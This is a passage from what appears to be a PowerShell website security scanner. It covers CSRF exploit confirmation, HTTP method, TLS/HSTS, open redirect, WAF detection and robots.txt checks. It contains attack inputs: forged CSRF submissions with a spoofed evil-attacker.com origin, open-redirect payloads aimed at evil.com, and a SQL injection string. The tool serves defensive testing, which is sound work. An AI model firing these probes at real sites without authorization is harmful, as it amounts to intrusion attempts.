                                    -suggestedFix "1. Generate unique CSRF token per session/request. 2. Include token in hidden field with type=hidden. 3. Validate token matches session on POST. 4. Reject requests with missing/invalid tokens. 5. Add SameSite=Lax to session cookie as defense-in-depth. Frameworks: Django csrf_token, Rails authenticity_token, Express csurf." `
                                    -url $authUrl `
                                    -category "Access Control" `
                                    -cweId "CWE-352" `
                                    -issueType "CSRF" `
                                    -confidence "High" `
                                    -evidence @{
                                        Endpoint = $endpoint
                                        Method = $method
                                        Action = $action
                                        RequiresAuth = $true
                                        FormSnippet = $formContent.Substring(0, [Math]::Min(150, $formContent.Length))
                                    }
                            }
                        }
                    }
                }
                
                if ($script:AggressiveAccess) {
                    Start-Sleep -Milliseconds 100
                }
            }
            
            if ($authFormsFound -gt 0) {
                Write-Host ""
                Write-Info "Authenticated CSRF Analysis:"
                Write-Info "  Authenticated forms found: $authFormsFound"
                Write-Info "  Forms without CSRF tokens: $authFormsWithoutToken"
                
                if ($authFormsWithoutToken -eq 0) {
                    Write-Success "All authenticated forms have CSRF protection"
                } else {
                    Write-Danger "CRITICAL: $authFormsWithoutToken authenticated form(s) lack CSRF tokens"
                }
            } else {
                Write-Info "No authenticated state-changing forms found (endpoints may require specific paths)"
            }
            
            # ========== PHASE 5: CSRF EXPLOIT TESTING (PROOF OF EXPLOITABILITY) ==========
            if ($authFormsWithoutToken -gt 0) {
                Write-Host ""
                Write-Danger "Phase 5: Attempting CSRF exploitation on vulnerable forms..."
                Write-Info "Testing if forms are actually exploitable (not just missing tokens)"
                
                $exploitableEndpoints = @()
                
                # Re-test authenticated endpoints that had forms without CSRF tokens
                foreach ($endpoint in $authEndpoints) {
                    $authUrl = $site + $endpoint
                    $authResponse = Invoke-SafeWebRequest -uri $authUrl -method "GET" -useAuth $true -timeoutSec 5
                    
                    if ($authResponse.Success -and $authResponse.Content) {
                        $authHtml = $authResponse.Content
                        $authForms = [regex]::Matches($authHtml, $formPattern)
                        
                        foreach ($form in $authForms) {
                            $formContent = $form.Value
                            
                            if ($formContent -match $methodPattern) {
                                $method = $Matches[1].ToUpper()
                                
                                # Extract action
                                $action = $endpoint
                                if ($formContent -match $actionPattern) {
                                    $extractedAction = $Matches[1]
                                    if ($extractedAction -match '^http') {
                                        $action = $extractedAction
                                    } elseif ($extractedAction -match '^/') {
                                        $action = $extractedAction
                                    } else {
                                        $action = $endpoint + "/" + $extractedAction
                                    }
                                }
                                
                                # Check if form has CSRF token
                                $hasToken = $false
                                foreach ($potentialToken in $tokenNames) {
                                    $inputPattern = "<input[^>]*name\s*=\s*[" + "`"'" + "]" + $potentialToken + "[" + "`"'" + "][^>]*>"
                                    if ($formContent -match $inputPattern) {
                                        $hasToken = $true
                                        break
                                    }
                                }
                                
                                if (-not $hasToken -and $method -ne "GET") {
                                    Write-Info "Testing exploitability: $method $action"
                                    
                                    # Extract form fields to build a realistic payload
                                    $formFields = @{}
                                    $inputPattern = '<input[^>]*name\s*=\s*[' + "`"'" + ']([^' + "`"'" + ']+)[' + "`"'" + '][^>]*>'
                                    $inputs = [regex]::Matches($formContent, $inputPattern)
                                    
                                    foreach ($input in $inputs) {
                                        $fieldName = $input.Groups[1].Value
                                        # Skip CSRF token fields (if they exist but we missed them)
                                        if ($fieldName -notmatch 'csrf|token|authenticity') {
                                            $formFields[$fieldName] = "csrf_test_value"
                                        }
                                    }
                                    
                                    # Add common test fields if none found
                                    if ($formFields.Count -eq 0) {
                                        if ($action -match 'profile|settings|account') {
                                            $formFields = @{
                                                "name" = "CSRFTestUser"
                                                "email" = "csrf-test@example.com"
                                            }
                                        } else {
                                            $formFields = @{
                                                "data" = "csrf_test_value"
                                            }
                                        }
                                    }
                                    
                                    # Test 1: Submit without CSRF token
                                    Write-Info "  Test 1: Submitting form WITHOUT CSRF token..."
                                    
                                    $targetUrl = if ($action -match '^http') { $action } else { $site + $action }
                                    
                                    $exploitResult = Invoke-SafeWebRequest `
                                        -uri $targetUrl `
                                        -method $method `
                                        -body ($formFields | ConvertTo-Json -Compress) `
                                        -headers @{
                                            "Content-Type" = "application/x-www-form-urlencoded"
                                            "Origin" = "https://evil-attacker.com"
                                            "Referer" = "https://evil-attacker.com/csrf-attack.html"
                                        } `
                                        -useAuth $true `
                                        -timeoutSec 5
                                    
                                    # Check if exploit succeeded
                                    if ($exploitResult.Success -and $exploitResult.StatusCode -in @(200, 201, 204, 302, 303)) {
                                        Write-Danger "  ✓ EXPLOIT CONFIRMED: Form accepted request without CSRF token!"
                                        Write-Danger "    Status: $($exploitResult.StatusCode) - Request processed successfully"
                                        
                                        $exploitableEndpoints += @{
                                            Endpoint = $action
                                            Method = $method
                                            StatusCode = $exploitResult.StatusCode
                                            ExploitType = "No CSRF Token Required"
                                        }
                                        
                                        Add-Issue -severity "Critical" `
                                            -title "CONFIRMED EXPLOITABLE CSRF Vulnerability" `
                                            -description "PROOF OF CONCEPT SUCCESSFUL: Endpoint $action accepts $method requests without CSRF token validation. Submitted malicious request from evil-attacker.com origin with victim's session cookie - request was ACCEPTED (Status: $($exploitResult.StatusCode)). This is a proven, exploitable vulnerability." `
                                            -remediation "URGENT: Implement CSRF token validation immediately. Every state-changing request MUST validate an unpredictable token tied to the user's session." `
                                            -whyItMatters "This is a CONFIRMED exploit. An attacker can create a malicious website that submits hidden forms to $action. When a logged-in user visits the attacker's site, their browser automatically sends session cookies, and the form submission succeeds. The attacker can: change user settings, modify profile data, perform transactions, or delete data - all without the user's knowledge or consent." `
                                            -suggestedFix "1. Generate cryptographically random CSRF token per session. 2. Store token in session. 3. Include token in all forms as hidden field. 4. Validate token on POST/PUT/DELETE/PATCH requests - reject if missing or invalid. 5. Add SameSite=Lax to session cookie as defense-in-depth. Frameworks: Django csrf_token, Rails authenticity_token, .NET AntiForgeryToken, Express csurf middleware." `
                                            -url $targetUrl `
                                            -category "Access Control" `
                                            -cweId "CWE-352" `
                                            -issueType "CSRF" `
                                            -confidence "Confirmed" `
                                            -evidence @{
                                                Endpoint = $action
                                                Method = $method
                                                StatusCode = $exploitResult.StatusCode
                                                MaliciousOrigin = "https://evil-attacker.com"
                                                CSRFTokenProvided = $false
                                                RequestAccepted = $true
                                                ExploitConfirmed = $true
                                                TestPayload = ($formFields | ConvertTo-Json -Compress)
                                            }
                                    }
                                    elseif ($exploitResult.StatusCode -in @(403, 401, 419)) {
                                        Write-Success "  ✓ PROTECTED: Request rejected (Status: $($exploitResult.StatusCode))"
                                        Write-Info "    Form correctly validates CSRF token server-side"
                                    }
                                    else {
                                        Write-Info "  ? INCONCLUSIVE: Status $($exploitResult.StatusCode) - manual verification needed"
                                    }
                                    
                                    # Test 2: Submit with invalid CSRF token
                                    Write-Info "  Test 2: Submitting form with INVALID CSRF token..."
                                    
                                    $formFieldsWithFakeToken = $formFields.Clone()
                                    $formFieldsWithFakeToken['csrf_token'] = 'invalid_fake_token_12345'
                                    
                                    $exploitResult2 = Invoke-SafeWebRequest `
                                        -uri $targetUrl `
                                        -method $method `
                                        -body ($formFieldsWithFakeToken | ConvertTo-Json -Compress) `
                                        -headers @{
                                            "Content-Type" = "application/x-www-form-urlencoded"
                                        } `
                                        -useAuth $true `
                                        -timeoutSec 5
                                    
                                    if ($exploitResult2.Success -and $exploitResult2.StatusCode -in @(200, 201, 204, 302, 303)) {
                                        Write-Danger "  ✓ EXPLOIT CONFIRMED: Form accepts INVALID CSRF token!"
                                        
                                        Add-Issue -severity "Critical" `
                                            -title "CSRF Token Not Validated Server-Side" `
                                            -description "Endpoint $action accepts requests with INVALID CSRF tokens (Status: $($exploitResult2.StatusCode)). The application generates tokens but does not validate them, providing false sense of security." `
                                            -remediation "Fix server-side validation logic to reject requests with missing or invalid CSRF tokens" `
                                            -whyItMatters "Token validation is broken. Attackers can submit arbitrary token values and bypass CSRF protection. This is worse than no protection because developers assume they are protected when they are not." `
                                            -category "Access Control" `
                                            -cweId "CWE-352" `
                                            -confidence "Confirmed"
                                    }
                                    elseif ($exploitResult2.StatusCode -in @(403, 401, 419)) {
                                        Write-Success "  ✓ PROTECTED: Invalid token rejected (Status: $($exploitResult2.StatusCode))"
                                    }
                                    
                                    if ($script:AggressiveAccess) {
                                        Start-Sleep -Milliseconds 200
                                    }
                                }
                            }
                        }
                    }
                }
                
                # Summary of exploit testing
                if ($exploitableEndpoints.Count -gt 0) {
                    Write-Host ""
                    Write-Danger "========================================="
                    Write-Danger "CRITICAL: $($exploitableEndpoints.Count) CONFIRMED EXPLOITABLE CSRF VULNERABILITIES"
                    Write-Danger "========================================="
                    
                    foreach ($exploit in $exploitableEndpoints) {
                        Write-Danger "  • $($exploit.Method) $($exploit.Endpoint) - Status: $($exploit.StatusCode)"
                    }
                    
                    Write-Host ""
                    Write-Danger "These vulnerabilities have been PROVEN exploitable through live testing."
                    Write-Danger "An attacker can force authenticated users to perform unwanted actions."
                    Write-Danger "IMMEDIATE remediation required."
                } else {
                    Write-Host ""
                    Write-Success "Exploit testing completed: No confirmed CSRF exploits (protection is working)"
                }
            }
        } else {
            Write-Host ""
            Write-Info "NOTE: Authenticated CSRF testing skipped (no session provided)"
            Write-Info "For complete CSRF analysis, provide: -SessionCookie 'session=...' or -Username/-Password"
            Write-Info "Authenticated forms often contain sensitive actions (password change, settings update, payment)"
        }
        
        if ($result.Metrics.FormsWithoutTokens -eq 0 -and $result.Metrics.CookiesWithSameSite -gt 0) {
            Write-Success "CSRF protection appears adequate (public pages)"
        }
        elseif ($result.Metrics.FormsWithoutTokens -gt 0 -and $result.Metrics.CookiesWithoutSameSite -gt 0) {
            Write-Danger "CSRF protection is insufficient - multiple weaknesses detected"
        }
        elseif ($result.Metrics.FormsWithoutTokens -gt 0) {
            Write-Warning "CSRF tokens missing on state-changing forms - HIGH risk"
        }
        
        $result.Status = "Completed"
        Complete-SecurityTest
    }
    catch {
        Write-Danger "CSRF test failed: $_"
        Write-Log "Test 09 failed: $_" "ERROR"
        $result.Status = "Failed"
        Complete-SecurityTest "Failed"
    }
    
    return $result
}

# ============================================================================
# TEST 12: HTTP Methods
# ============================================================================
function Test-HTTPMethods {
    Start-SecurityTest "HTTP Methods Testing" "12"
    
    $methods = @("GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE", "CONNECT", "HEAD")
    $allowedMethods = @()
    $disallowedMethods = @()
    
    Write-Info "Testing HTTP methods..."
    
    foreach ($method in $methods) {
        $result = Invoke-SafeWebRequest -uri $site -method $method -timeoutSec 3
        
        if ($result.Success) {
            $allowedMethods += "$method ($($result.StatusCode))"
            
            if ($method -in @("TRACE", "CONNECT")) {
                Write-Danger "Dangerous method allowed: $method (Status: $($result.StatusCode))"
                Add-Issue -severity "High" -title "Dangerous HTTP Method: $method" `
                    -description "$method method is enabled on $site - Cross-Site Tracing (XST) risk" `
                    -remediation "Disable TRACE and CONNECT methods in web server config" `
                    -whyItMatters "TRACE method can expose HttpOnly cookies via XST attacks. CONNECT may enable proxy abuse." `
                    -suggestedFix "Apache: TraceEnable Off | Nginx: add 'if (\$request_method = TRACE) { return 405; }' | IIS: disable TRACE in handler mappings"
            } elseif ($method -in @("PUT", "DELETE", "PATCH")) {
                Write-Warning "Potentially dangerous method allowed: $method (Status: $($result.StatusCode))"
                Add-Issue -severity "Medium" -title "Unrestricted HTTP Method: $method" `
                    -description "$method method is allowed - may permit unauthorized modifications if not properly secured" `
                    -remediation "Restrict $method to authenticated/authorized users only" `
                    -whyItMatters "PUT/DELETE/PATCH can modify/remove resources. Without proper authorization checks, attackers can manipulate data." `
                    -suggestedFix "Implement method-level authorization. Return 405 for unauthenticated requests. Use Limit directives (Apache) or location blocks (Nginx)."
            } else {
                Write-Success "$method allowed (Status: $($result.StatusCode))"
            }
        } elseif ($result.StatusCode -eq 405) {
            $disallowedMethods += "$method (405)"
            Write-Success "$method not allowed (405 Method Not Allowed)"
        } else {
            Write-Debug "$method - Status: $($result.StatusCode)"
        }
    }
    
    # Summary
    if ($allowedMethods.Count -gt 0) {
        Write-Info "Allowed methods: $($allowedMethods -join ', ')"
    }
    if ($disallowedMethods.Count -gt 0) {
        Write-Info "Disallowed methods: $($disallowedMethods -join ', ')"
    }
    
    # Check OPTIONS response for Allow header
    $optionsResult = Invoke-SafeWebRequest -uri $site -method "OPTIONS" -timeoutSec 3
    if ($optionsResult.Success -and $optionsResult.Headers -and $optionsResult.Headers.ContainsKey('Allow')) {
        $allowHeader = $optionsResult.Headers['Allow']
        Write-Info "Allow header reports: $allowHeader"
        
        # Cross-check if dangerous methods are advertised
        if ($allowHeader -match 'TRACE|CONNECT') {
            Write-Warning "Server advertises dangerous methods in Allow header"
        }
    }
    
    Complete-SecurityTest
}

# ============================================================================
# TEST 2 (TLS): TLS / TRANSPORT SECURITY
# ============================================================================
function Test-TLS {
    Start-SecurityTest "TLS / Transport Security" "02-TLS"
    
    $result = @{
        Name = "TLSConfig"
        Status = "Completed"
        Duration = 0
        Issues = @()
        Evidence = @{}
        Metrics = @{
            TLSEnforced = $false
            RedirectToHTTPS = $false
            HSTS = @{
                Present = $false
                MaxAge = 0
                IncludeSubDomains = $false
                Preload = $false
            }
        }
    }
    
    try {
        Write-Info "Phase 1: HTTPS Support Check..."
        
        $uri = [System.Uri]$site
        
        if ($uri.Scheme -eq "https") {
            Write-Success "Site uses HTTPS"
            $result.Metrics.TLSEnforced = $true
            
            # ========== HTTP -> HTTPS REDIRECT CHECK ==========
            Write-Info "Phase 2: HTTP->HTTPS Redirect Behavior..."
            
            $httpUrl = $site -replace "^https", "http"
            $redirectResult = Invoke-SafeWebRequest -uri $httpUrl -method "HEAD" -allowRedirect $false
            
            if ($redirectResult.StatusCode -in @(301, 302, 303, 307, 308)) {
                $location = $redirectResult.Headers['Location']
                
                if ($location -match "^https://") {
                    Write-Success "HTTP redirects to HTTPS (Status: $($redirectResult.StatusCode))"
                    $result.Metrics.RedirectToHTTPS = $true
                    
                    if ($redirectResult.StatusCode -eq 301 -or $redirectResult.StatusCode -eq 308) {
                        Write-Success "Using permanent redirect (good)"
                    }
                    else {
                        Write-Warning "Using temporary redirect - consider 301 or 308 for better caching"
                        Add-Issue -severity "Low" `
                            -title "Temporary HTTPS Redirect" `
                            -description "HTTP->HTTPS redirect uses status $($redirectResult.StatusCode) (temporary) instead of 301/308 (permanent)" `
                            -remediation "Use HTTP 301 or 308 for permanent redirects to improve caching" `
                            -issueType "SecurityMisconfiguration" `
                            -confidence "High"
                    }
                }
                else {
                    Write-Warning "HTTP redirect doesn't use HTTPS: $location"
                    Add-Issue -severity "High" `
                        -title "Invalid HTTPS Redirect" `
                        -description "HTTP version redirects but not to HTTPS. Location: $location" `
                        -remediation "Ensure HTTP redirects to HTTPS version of the site" `
                        -issueType "SecurityMisconfiguration" `
                        -confidence "High"
                }
            }
            else {
                Write-Warning "No HTTP to HTTPS redirect detected (Status: $($redirectResult.StatusCode))"
                Add-Issue -severity "High" `
                    -title "Missing HTTPS Redirect" `
                    -description "HTTP version doesn't redirect to HTTPS, allowing insecure access" `
                    -remediation "Configure 301/308 redirect from HTTP to HTTPS" `
                    -issueType "SecurityMisconfiguration" `
                    -confidence "High"
            }
            
            # ========== HSTS VALIDATION ==========
            Write-Info "Phase 3: HSTS (HTTP Strict Transport Security) Analysis..."
            
            $httpsResult = Invoke-SafeWebRequest -uri $site -method "HEAD"
            
            if ($httpsResult.Success -and $httpsResult.Headers) {
                $hstsHeader = $httpsResult.Headers['Strict-Transport-Security']
                
                if ($hstsHeader) {
                    Write-Success "HSTS header present: $hstsHeader"
                    $result.Metrics.HSTS.Present = $true
                    
                    # Parse max-age
                    if ($hstsHeader -match 'max-age=(\d+)') {
                    $maxAge = [int]$Matches[1]
                    $result.Metrics.HSTS.MaxAge = $maxAge
                    
                    $maxAgeDays = [math]::Round($maxAge / 86400, 1)
                    Write-Info ("HSTS max-age: " + $maxAge + " seconds (" + $maxAgeDays + " days)")
                    
                    # RFC recommends at least 1 year (31536000 seconds)
                    if ($maxAge -lt 31536000) {
                        Write-Warning "HSTS max-age is less than 1 year (recommended: 31536000 seconds)"
                        Add-Issue -severity "Medium" `
                            -title "Weak HSTS max-age" `
                            -description "HSTS max-age is $maxAge seconds ($([math]::Round($maxAge / 86400, 1)) days). RFC recommends at least 1 year (31536000 seconds)." `
                            -remediation "Increase HSTS max-age to at least 31536000 (1 year): Strict-Transport-Security: max-age=31536000; includeSubDomains; preload" `
                            -issueType "SecurityMisconfiguration" `
                            -confidence "High"
                    }
                    else {
                        Write-Success "HSTS max-age is sufficient (>= 1 year)"
                    }
                }
                else {
                    Write-Warning "Could not parse max-age from HSTS header"
                }
                
                # Check includeSubDomains
                if ($hstsHeader -match 'includeSubDomains') {
                    Write-Success "HSTS includeSubDomains directive present"
                    $result.Metrics.HSTS.IncludeSubDomains = $true
                }
                else {
                    Write-Warning "HSTS missing 'includeSubDomains' directive"
                    Add-Issue -severity "Medium" `
                        -title "HSTS Missing includeSubDomains" `
                        -description "HSTS header doesn't include 'includeSubDomains' directive, leaving subdomains vulnerable" `
                        -remediation "Add includeSubDomains to HSTS header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload" `
                        -issueType "SecurityMisconfiguration" `
                        -confidence "High"
                }
                
                # Check preload
                if ($hstsHeader -match 'preload') {
                    Write-Success "HSTS preload directive present (site can be added to browser preload lists)"
                    $result.Metrics.HSTS.Preload = $true
                }
                else {
                    Write-Info "HSTS missing 'preload' directive (optional but recommended for high-security sites)"
                    Add-Issue -severity "Low" `
                        -title "HSTS Missing Preload Directive" `
                        -description "HSTS header doesn't include 'preload' directive. This is optional but recommended for inclusion in browser HSTS preload lists." `
                        -remediation "Consider adding preload directive and submitting to https://hstspreload.org/: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload" `
                        -issueType "SecurityMisconfiguration" `
                        -confidence "Medium"
                }
            }
            else {
                Write-Danger "HSTS header NOT present (already flagged in Security Headers test)"
                Write-Info "Note: Missing HSTS was reported as HIGH severity in Test 02: Security Headers"
                # Don't add duplicate issue - Security Headers test already logged this as HIGH
            }
            }
            else {
                Write-Warning "Could not retrieve HTTPS response headers for detailed HSTS analysis"
                Write-Info "Note: HSTS presence/absence was already evaluated in Test 02: Security Headers"
            }
            
            Write-Info "For comprehensive TLS cipher suite analysis, use SSL Labs: https://www.ssllabs.com/ssltest/"
        }
        else {
            # No HTTPS at all
            Write-Danger "Site does not use HTTPS!"
            
            Add-Issue -severity "Critical" `
                -title "No HTTPS / TLS Encryption" `
                -description "Site is served entirely over insecure HTTP without any encryption. All traffic including credentials and session tokens are transmitted in plaintext." `
                -remediation "Implement HTTPS with a valid TLS certificate. Use Let's Encrypt for free certificates." `
                -url "https://letsencrypt.org/" `
                -issueType "SecurityMisconfiguration" `
                -confidence "High"
            
            # Check if login/session cookies would be sent over HTTP
            Write-Warning "Any session cookies or credentials transmitted over this connection can be intercepted"
        }
        
        $result.Status = "Completed"
        Complete-SecurityTest
    }
    catch {
        Write-Danger "TLS test failed: $_"
        Write-Log "Test TLS failed: $_" "ERROR"
        $result.Status = "Failed"
        Complete-SecurityTest "Failed"
    }
    
    return $result
}

# ============================================================================
# TEST 14: Open Redirect
# ============================================================================
function Test-OpenRedirect {
    Start-SecurityTest "Open Redirect Testing" "14"
    
    $redirectTests = @(
        @{ Path = "/redirect"; Param = "url"; Value = "https://evil.com" },
        @{ Path = "/redirect"; Param = "url"; Value = "//evil.com" },
        @{ Path = "/redirect"; Param = "next"; Value = "https://evil.com" },
        @{ Path = "/redirect"; Param = "return"; Value = "https://evil.com" },
        @{ Path = "/login"; Param = "redirect"; Value = "https://evil.com" },
        @{ Path = "/logout"; Param = "url"; Value = "https://evil.com" },
        @{ Path = "/"; Param = "return"; Value = "https://evil.com" },
        @{ Path = "/"; Param = "returnTo"; Value = "//evil.com/phishing" },
        @{ Path = "/oauth/callback"; Param = "redirect_uri"; Value = "https://attacker.com" }
    )
    
    $vulnerableEndpoints = @()
    
    foreach ($test in $redirectTests) {
        $testUrl = "$site$($test.Path)?$($test.Param)=$($test.Value)"
        $result = Invoke-SafeWebRequest -uri $testUrl -method "GET" -allowRedirect $false -timeoutSec 5
        
        if ($result.StatusCode -in @(301, 302, 303, 307, 308)) {
            $location = ""
            if ($result.Headers -and $result.Headers.ContainsKey('Location')) {
                $location = $result.Headers['Location']
            }
            
            # Check if Location header reflects our malicious domain
            if ($location -match "evil\.com|attacker\.com") {
                Write-Danger "Open redirect confirmed: $($test.Path)?$($test.Param)=$($test.Value) -> $location"
                $vulnerableEndpoints += "$($test.Path)?$($test.Param)="
                
                Add-Issue -severity "High" -title "Open Redirect Vulnerability" `
                    -description "Application redirects to arbitrary external URL. Payload: $($test.Param)=$($test.Value) redirected to: $location" `
                    -url $testUrl `
                    -remediation "Validate redirect URLs against whitelist" `
                    -whyItMatters "Open redirects are used in phishing attacks. Attackers craft legitimate-looking URLs (yourdomain.com/redirect?url=evil.com) to trick users into visiting malicious sites." `
                    -suggestedFix "Implement whitelist validation: only allow redirects to same domain or explicitly trusted domains. Use indirect references (tokens) instead of direct URLs."
                    
            } elseif ($location -ne "") {
                # Redirect happened but to safe location - still log as info
                Write-Info "$($test.Path)?$($test.Param)= redirects to: $location (safe, within domain)"
            }
        } elseif ($result.StatusCode -eq 200) {
            # Page accepted parameter but didn't redirect - still potentially dangerous
            Write-Debug "$($test.Path)?$($test.Param)= accepted but no redirect (200 OK)"
        }
    }
    
    if ($vulnerableEndpoints.Count -gt 0) {
        Write-Warning "Summary: $($vulnerableEndpoints.Count) vulnerable redirect endpoint(s) found: $($vulnerableEndpoints -join ', ')"
    } else {
        Write-Success "No open redirect vulnerabilities detected in tested parameters"
    }
    
    # Test for protocol-relative redirects (bypass filters)
    $protocolTest = "$site/?url=//evil.com"
    $protResult = Invoke-SafeWebRequest -uri $protocolTest -method "GET" -allowRedirect $false -timeoutSec 5
    if ($protResult.StatusCode -in @(301, 302, 303, 307, 308)) {
        $loc = ""
        if ($protResult.Headers -and $protResult.Headers.ContainsKey('Location')) {
            $loc = $protResult.Headers['Location']
        }
        if ($loc -match "//evil\.com") {
            Write-Danger "Protocol-relative open redirect: //evil.com -> $loc"
            Add-Issue -severity "High" -title "Protocol-Relative Open Redirect" `
                -description "Application accepts protocol-relative URLs (//evil.com) for redirection to: $loc" `
                -url $protocolTest `
                -remediation "Block protocol-relative URLs in redirect validation" `
                -whyItMatters "//evil.com bypasses naive https:// filters. Browser treats it as same-protocol redirect, making phishing attacks stealthier." `
                -suggestedFix "Reject any redirect URL starting with //. Parse URLs properly and validate full scheme://domain."
        }
    }
    
    Complete-SecurityTest
}

# ============================================================================
# TEST 14B: WAF & Bot Defense Detection
# ============================================================================
function Test-WAFDetection {
    Start-SecurityTest "WAF & Bot Defense Detection" "14B"
    
    Write-Info "Analyzing WAF/CDN presence and configuration..."
    
    # ========================================================================
    # PHASE 1: Header-Based WAF Detection
    # ========================================================================
    Write-Info "Checking for WAF-specific response headers..."
    $result = Invoke-SafeWebRequest -uri $site -method "GET" -timeoutSec 5
    
    $wafIndicators = @()
    $detectedWAF = $null
    
    if ($result.Headers) {
        # Cloudflare
        if ($result.Headers.ContainsKey('cf-ray') -or $result.Headers.ContainsKey('cf-cache-status')) {
            $wafIndicators += "Cloudflare WAF"
            $detectedWAF = "Cloudflare"
            Write-Info "Detected: Cloudflare WAF"
            if ($result.Headers.ContainsKey('cf-ray')) {
                Write-Info "  CF-Ray: $($result.Headers['cf-ray'])"
            }
        }
        
        # AWS CloudFront
        if ($result.Headers.ContainsKey('x-amz-cf-id') -or $result.Headers.ContainsKey('x-amzn-requestid')) {
            $wafIndicators += "AWS CloudFront/WAF"
            $detectedWAF = "AWS CloudFront"
            Write-Info "Detected: AWS CloudFront (may include AWS WAF)"
        }
        
        # Akamai
        $akamaiHeaders = $result.Headers.Keys | Where-Object { $_ -like 'x-akamai-*' }
        if ($akamaiHeaders.Count -gt 0) {
            $wafIndicators += "Akamai WAF"
            $detectedWAF = "Akamai"
            Write-Info "Detected: Akamai WAF"
        }
        
        # Imperva/Incapsula
        if ($result.Headers.ContainsKey('x-iinfo') -or $result.Headers.ContainsKey('x-cdn')) {
            if ($result.Headers['x-cdn'] -match 'incap') {
                $wafIndicators += "Imperva Incapsula"
                $detectedWAF = "Imperva Incapsula"
                Write-Info "Detected: Imperva Incapsula WAF"
            }
        }
        
        # Sucuri WAF
        if ($result.Headers.ContainsKey('x-sucuri-id') -or $result.Headers.ContainsKey('x-sucuri-cache')) {
            $wafIndicators += "Sucuri WAF"
            $detectedWAF = "Sucuri"
            Write-Info "Detected: Sucuri WAF"
        }
        
        # F5 BIG-IP ASM
        if ($result.Headers.ContainsKey('x-waf-event-info')) {
            $wafIndicators += "F5 BIG-IP ASM"
            $detectedWAF = "F5 BIG-IP"
            Write-Info "Detected: F5 BIG-IP ASM"
        }
        
        # Fortinet FortiWeb
        if ($result.Headers.ContainsKey('fortiwafsid')) {
            $wafIndicators += "Fortinet FortiWeb"
            $detectedWAF = "Fortinet FortiWeb"
            Write-Info "Detected: Fortinet FortiWeb"
        }
        
        # Barracuda WAF
        if ($result.Headers.ContainsKey('barra-counter')) {
            $wafIndicators += "Barracuda WAF"
            $detectedWAF = "Barracuda"
            Write-Info "Detected: Barracuda WAF"
        }
    }
    
    # ========================================================================
    # PHASE 2: Behavior-Based Detection (SQL Injection Test)
    # ========================================================================
    Write-Info "Testing WAF behavior with malicious payload..."
    $attackPayload = "1' OR '1'='1"
    $testUrl = "$site/?test=$attackPayload"
    $attackResult = Invoke-SafeWebRequest -uri $testUrl -method "GET" -timeoutSec 5
    
    $blockDetected = $false
    
    if ($attackResult.StatusCode -in @(403, 406, 409, 419, 429, 503)) {
        Write-Warning "Request blocked with status $($attackResult.StatusCode) - WAF likely active"
        $blockDetected = $true
    }
    
    if ($attackResult.Content) {
        $blockPagePatterns = @(
            'access denied', 'blocked', 'security policy', 'firewall',
            'suspicious activity', 'request has been blocked',
            'your request was blocked', 'security violation',
            'incident id', 'reference id', 'contact support',
            'cloudflare ray id', 'attention required', 'unusual activity',
            'automated query', 'captcha', 'are you a robot'
        )
        
        $contentLower = $attackResult.Content.ToLower()
        foreach ($pattern in $blockPagePatterns) {
            if ($contentLower -match [regex]::Escape($pattern)) {
                Write-Warning "Block page detected (pattern: '$pattern')"
                $blockDetected = $true
                break
            }
        }
    }
    
    # ========================================================================
    # PHASE 3: Bot Defense Detection (Rate-Based)
    # ========================================================================
    Write-Info "Testing bot defense mechanisms..."
    $botTestResults = @()
    
    for ($i = 1; $i -le 10; $i++) {
        $rapidResult = Invoke-SafeWebRequest -uri $site -method "GET" -timeoutSec 3
        $botTestResults += $rapidResult.StatusCode
        
        if ($rapidResult.StatusCode -eq 429) {
            Write-Success "Rate limiting active (HTTP 429) - good bot defense"
            break
        }
        
        if ($rapidResult.StatusCode -eq 503 -and $rapidResult.Content -match 'captcha|challenge') {
            Write-Success "CAPTCHA challenge triggered - strong bot defense"
            break
        }
        
        Start-Sleep -Milliseconds 100
    }
    
    # ========================================================================
    # PHASE 4: Report Findings
    # ========================================================================
    if ($wafIndicators.Count -gt 0) {
        $wafList = $wafIndicators -join ", "
        Write-Success "WAF/CDN Detected: $wafList"
        
        Add-Issue -severity "Info" `
            -title "WAF/CDN Protection Detected" `
            -description "Detected Web Application Firewall or CDN service: $wafList. This provides additional security layer against common attacks." `
            -remediation "Ensure WAF rules are properly configured and updated regularly" `
            -issueType "SecurityFeature" `
            -evidence @{
                DetectedWAF = $detectedWAF
                Indicators = $wafList
                BlockTested = $blockDetected
            }
    } else {
        if ($blockDetected) {
            Write-Warning "No WAF headers detected, but blocking behavior observed"
            Write-Info "Site may use custom WAF or security middleware"
            
            Add-Issue -severity "Info" `
                -title "Potential Custom WAF/Security Middleware" `
                -description "No commercial WAF headers detected, but request blocking behavior suggests security middleware is active." `
                -issueType "SecurityFeature"
        } else {
            Write-Warning "No WAF or bot defense mechanisms detected"
            
            Add-Issue -severity "Low" `
                -title "No Web Application Firewall Detected" `
                -description "No evidence of WAF, CDN protection, or bot defense mechanisms. Site may be vulnerable to automated attacks." `
                -remediation "Consider implementing a WAF solution (Cloudflare, AWS WAF, Akamai) for protection against OWASP Top 10 attacks" `
                -whyItMatters "WAFs provide protection against SQL injection, XSS, CSRF, and other common attacks. They also mitigate DDoS and bot attacks. Without a WAF, application must handle all security validation, increasing attack surface." `
                -suggestedFix "Implement a cloud-based WAF like Cloudflare (free tier available) or AWS WAF. Configure OWASP Core Rule Set (CRS) for baseline protection. Enable bot management and rate limiting." `
                -issueType "MissingDefense"
        }
    }
    
    Complete-SecurityTest
}

# ============================================================================
# TEST 15: Information Disclosure
# ============================================================================
function Test-InformationDisclosure {
    Start-SecurityTest "Information Disclosure Analysis" "15"
    
    # robots.txt
    $result = Invoke-SafeWebRequest -uri ($site + "/robots.txt") -method "GET" -timeoutSec 5
    if ($result.Success) {
        Write-Success "robots.txt found"
        
        # Extract sensitive Disallow entries
        $sensitivePatterns = @('/admin', '/backup', '/config', '/private', '/internal', '/api', '/old', '/temp', '/test', '/.git', '/.env')
        $foundPaths = @()
        foreach ($pattern in $sensitivePatterns) {
            if ($result.Content -match "Disallow:.*$([regex]::Escape($pattern))") {
                $foundPaths += $pattern
            }
        }
        
        if ($foundPaths.Count -gt 0) {
            Write-Warning "robots.txt reveals sensitive paths: $($foundPaths -join ', ')"
            Add-Issue -severity "Low" -title "Sensitive Paths in robots.txt" `
                -description "robots.txt exposes sensitive directory names: $($foundPaths -join ', ')" `
                -remediation "Avoid listing sensitive paths in robots.txt" `
                -whyItMatters "Attackers use robots.txt as reconnaissance. Listing /admin, /backup, etc. creates a roadmap to valuable targets." `
